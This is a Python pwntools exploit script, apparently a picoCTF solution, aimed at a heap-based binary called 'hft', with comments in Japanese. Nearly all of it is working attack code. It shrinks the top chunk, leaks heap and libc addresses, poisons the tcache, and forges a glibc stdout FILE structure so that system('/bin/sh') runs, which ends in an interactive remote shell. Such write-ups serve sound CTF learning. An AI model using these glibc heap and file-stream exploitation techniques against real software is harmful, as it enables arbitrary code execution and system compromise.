from pwn import *

# Exploit configs
binary = ELF('hft_patched')
host = 'tethys.picoctf.net'
port = 64435
libc = ELF('./libc.so.6', checksec=False)
#remote_libc = ELF('./libc6_2.36.so', checksec=False)
#ld = ELF('./ld-x.xx.so', checksec=False)

#call GDB
##############################################################################################
def launch_gdb(breakpoints=[], cmds=[]):
    if args.GDB:
        info("Attaching Debugger")
        cmds.append('handle SIGALRM ignore')
        cmds.append('set follow-fork-mode parent')
        for b in breakpoints:
            cmds.insert(0,'b *' + str(binary.address + b))
        gdb.attach(io, gdbscript='\n'.join(cmds))
    else:
        return
##############################################################################################

def defuscate(x,l=64):
    p = 0
    for i in range(l*4,0,-4): # 16 nibble
        v1 = (x & (0xf << i )) >> i
        v2 = (p & (0xf << i+12 )) >> i+12
        p |= (v1 ^ v2) << i
    return p

def obfuscate(p, adr):
    return p^(adr>>12)

def recv_pkt_res():
    p = io.recvline()

def recv_pkt_boot():
    p = io.recvline()

def malloc(size, pkt_type, data):
    io.send(p64(size))
    io.sendline(p64(pkt_type) + data)
    p = io.recvuntil(b'm:')
    p = io.recvline()
    return p
    #malloc chunk
    #prev_size  8byte  malloc
    #size       8byte  malloc
    #sz         8byte  data  fd
    #pkt_type   8byte  data  bk
    #data      >8byte  data
    #.
    #.
    #.
def malloc_donot_write(size):
    io.send(p64(size))
    io.sendline(b'\xff')
    p = io.recvuntil(b'm:')
    p = io.recvline()
    return p

def leak(size):
    io.send(p64(size))
    io.sendline(b'\x01\x00\x00\x00\x00\x00\x00')
    p = io.recvuntil(b'm:')
    p = io.recvline()[1:-2]
    return p

def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _wide_data = 0,
              _mode = 0):
    #file_struct = p32(_flags) + \
    #         p32(0) + \
    file_struct = p64(_flags) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    file_struct = file_struct.ljust(0x88, b"\x00")
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, b"\x00")
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, b'\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, b"\x00")
    return file_struct

if __name__ == '__main__':
    # call with DEBUG to change log level
    # call with GDB to attach gdb
    # call with REMOTE to run against live target
    if args.REMOTE:
        args.GDB = False # disable gdb when working remote
        io = remote(host, port)
#        libc = remote_libc
    else:
#        io = process(binary.path, env={'LD_PRELOAD': remote_libc.path})
        io = process(binary.path, aslr=False)
#        libc = remote_libc
    if not args.REMOTE:
        for mmap in open('/proc/{}/maps'.format(io.pid),"rb").readlines():
            mmap = mmap.decode()
            if binary.path.split('/')[-1] == mmap.split('/')[-1][:-1]:
                binary.address = int(mmap.split('-')[0],16)
                break
    c = [
    'info registers',
    ]
    b = [0x012be]
    launch_gdb(breakpoints=b)

    recv_pkt_boot()

    
    #Top chunk size 収縮
    recv_pkt_res()
    p = malloc(0x18, 1, b'aaaaaaaa' + p64(0xd51))
    print("Top chunk size 収縮")

    #Top sizeより大きなchunkを確保し 元Top shunkからfree
    #unsorted binに繋ぐ
    recv_pkt_res()
    p = malloc(0xd58, 1, b'a')
    print("Top sizeより大きなchunkを確保し 元Top chunkからfree\nunsorted binに繋ぐ")
    recv_pkt_res()
    p = malloc_donot_write(0x908) #free chunkのsizeを0x420に調整
    print("free chunkのsizeを0x420に調整")

    #unsorted binのfree chunkを
    #largebinに接続
    recv_pkt_res()
    p = malloc_donot_write(0x428)
    print("unsorted binのfree chunkをlargebinに接続")

    #heap base leak
    recv_pkt_res()
    p = leak(0x18)
    print("heap base leak")
    heap_base = int.from_bytes(p, byteorder='little') - 0xbc0
    print(hex(heap_base))

    recv_pkt_res()
    p = malloc_donot_write(0x3b8)
    print("tcacheに収まるよう収縮")

    recv_pkt_res()
    p = malloc(0xe28, 0, b'a'*0xe18 + p64(0x41))
    print("top_chunkがtcacheに収まるよう収縮")

    recv_pkt_res()
    p = malloc(0x288, 1, b'a'*8)
    print("top_chunk収縮 tcache 0x20確保")


    print("\nstage 2\n")
    #0x40byteと0x20byteはおいておく

    #Top chunk size 収縮
    recv_pkt_res()
    p = malloc(0x48, 1, b'a'*0x38 + p64(0xd21))
    print("Top chunk size 収縮")

    recv_pkt_res()
    p = malloc(0xd58, 1, b'a')
    print("Top sizeより大きなchunkを確保し 元Top chunkからfree\nunsorted binに繋ぐ")
    recv_pkt_res()
    p = malloc(0xca8, 1, b'a')#free chunkのsizeを0x420に調整
    print("free chunkのsizeを0x50に調整")

    recv_pkt_res()
    p = malloc(0x1f8, 1, b'a')
    print("tcacheに収まるよう収縮")

    recv_pkt_res()
    p = malloc(0x58, 1, b'a'*0x48 + p64(0x41))
    print("Top chunk size 収縮")

    recv_pkt_res()
    p = malloc(0x288, 1, b'a'*0x48 + p64(0x21))
    print("tcache作成")

    recv_pkt_res()
    p = malloc(0x48, 0, b'a'*(0x5555555c0fd0 - 0x55555559efb8) + p64(0x21) + p64(obfuscate(heap_base + 0x55555555bfa0 - 0x55555555b000, heap_base + 0x5555555c0fd0 - 0x55555555b000)))
    print(p)
    print("tcache poisoning")

    recv_pkt_res()
    p = malloc(0x10, 1, b'a'*8)
    print(p)
    print("dummy chunk")

    recv_pkt_res()
    p = leak(0x10)
    libc_base = int.from_bytes(p, byteorder='little') - (0x155555419d10 - 0x155555200000)
    print("libc base")
    print(hex(libc_base))


    print("\nstage3\n")
    recv_pkt_res()
    p = malloc(0xc20, 1, b'a')
    print("tcacheのsizeに収縮")

    recv_pkt_res()
    p = malloc(0xf8, 1, b'a'*0xe8 + p64(0x41))
    print("Top chunk size 収縮")

    recv_pkt_res()
    p = malloc(0x288, 1, b'a'*0x48 + p64(0x21))
    print("tcache作成")
    
    recv_pkt_res()
    p = malloc(0x48, 1, b'a'*0x38 + p64(0xd21))
    print("Top chunkのsizeに収縮")
    
    #0x50byte
    recv_pkt_res()
    p = malloc(0xcb8, 1, b'a')
    print("smallbinのsizeに収縮2")

    recv_pkt_res()
    p = malloc(0x288, 1, b'a'*0x48 + p64(0x21))
    print("unsorted bin作成")

    recv_pkt_res()
    p = malloc(0xc20, 1, b'a')
    print("tcacheのsizeに収縮")

    recv_pkt_res()
    p = malloc(0xf8, 1, b'a'*0xe8 + p64(0x41))
    print("Top chunk size 収縮")

    recv_pkt_res()
    p = malloc(0x288, 1, b'a'*0x48 + p64(0x21))
    print("tcache作成")

    stdout = libc_base + libc.symbols['_IO_2_1_stdout_']
    stdout_lock = libc_base + 0x7ffff7f91a70 - 0x7ffff7d76000
    system = libc_base + libc.symbols['system']

    wide_data_ptr = stdout+0x10
    fake_vtable_ptr = stdout+0xe0-0x68
    fake_vtable = libc_base + 0x7ffff7f8bf58 - 0x7ffff7d76000 - 0x38 # part of _IO_wfile_jumps_maybe_mmap so that we can invoke _IO_wfile_overflow
    fake_file_struct = pack_file(_flags=0x3b01010101010101, _IO_read_ptr=u64(b'/bin/sh\x00'), _wide_data=wide_data_ptr, _lock=stdout_lock) + p64(fake_vtable) + p64(system) + p64(0) + p64(fake_vtable_ptr)

    recv_pkt_res()
    p = malloc(0x38, 0, b'a'*(0x555555626fc8-0x555555604fc0) + p64(0x21) + p64(obfuscate(stdout-0x10, heap_base + 0x555555626fd0 - 0x55555555b000)))
    print(p)
    print("tcache poisoning")

    recv_pkt_res()
    p = malloc(0x18, 1, b'a'*8)
    print(p)
    print("dummy chunk")

    recv_pkt_res()
    io.send(p64(0x18))
    io.sendline(p64(0x1) + fake_file_struct)
    io.interactive()

    """
    0x7dc538000000
    p64(0xd51)
    malloc(0x100, 1, b'aaaaaaaa' + p64(0xd51))
    p = io.recvline()
    print(p)
    0x55555555b000
    0x55555555bfc0
    0x55555555b2b0
    0x55555557dfc8

    0x55555559efb8
    0x5555555c0fc8

    0x555555604fc0
    0x555555626fc0

    0x555555626fd0

    """
